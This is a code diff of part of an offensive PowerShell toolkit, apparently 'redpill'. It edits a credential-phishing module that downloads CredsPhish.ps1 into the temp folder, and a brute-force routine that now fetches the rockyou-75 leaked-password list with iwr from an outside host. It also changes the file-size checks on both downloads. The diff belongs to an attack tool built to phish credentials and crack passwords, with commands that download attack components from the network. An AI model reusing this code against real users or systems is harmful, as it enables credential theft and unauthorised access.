@@ -1125,7 +1125,7 @@ If($PhishCreds -ieq "Start" -or $PhishCreds -ieq "Brute"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,158203125/KB
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,05078125/KB
    If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 17 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download CredsPhish.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
@@ -1442,8 +1442,9 @@ If($BruteZip -ne "false"){
    ## Download passwords.txt from my github repository
    If(-not(Test-Path -Path "$PassList")){## Check if password list exists
       $PassFile = $PassList.Split('\\')[-1]
-      Write-Host "[+] Downloading $PassFile (BITS)"
-      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/passwords.txt -Destination $PassList -ErrorAction SilentlyContinue|Out-Null
+      Write-Host "[+] Downloading $PassFile (iwr)"
+      iwr -uri https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt -OutFile $PassList
+      #Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/passwords.txt -Destination $PassList -ErrorAction SilentlyContinue|Out-Null
    }Else{## User Input dicionary
       $PassFile = $PassList.Split('\\')[-1]
       Write-Host "[i] dicionary $PassFile found!"
@@ -1454,8 +1455,8 @@ If($BruteZip -ne "false"){
    If(-not($PasFileStatus -ieq $True)){
       ## Check for file download integrity (fail/corrupted downloads)
       $CheckInt = Get-Content -Path "$PassList" -EA SilentlyContinue
-      $SizeDump = ((Get-Item -Path "$PassList" -EA SilentlyContinue).length/1KB) ## default => 7,865234375/KB
-      If(-not(Test-Path -Path "$PassList") -or $SizeDump -lt 7 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
+      $SizeDump = ((Get-Item -Path "$PassList" -EA SilentlyContinue).length/1KB) ## default => 467,7109375/KB
+      If(-not(Test-Path -Path "$PassList") -or $SizeDump -lt 467 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
          ## Fail to download password list using BitsTransfer OR the downloaded file is corrupted
          Write-Host "[abort] fail to download password list using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
          If(Test-Path -Path "$PassList"){Remove-Item -Path "$PassList" -Force}
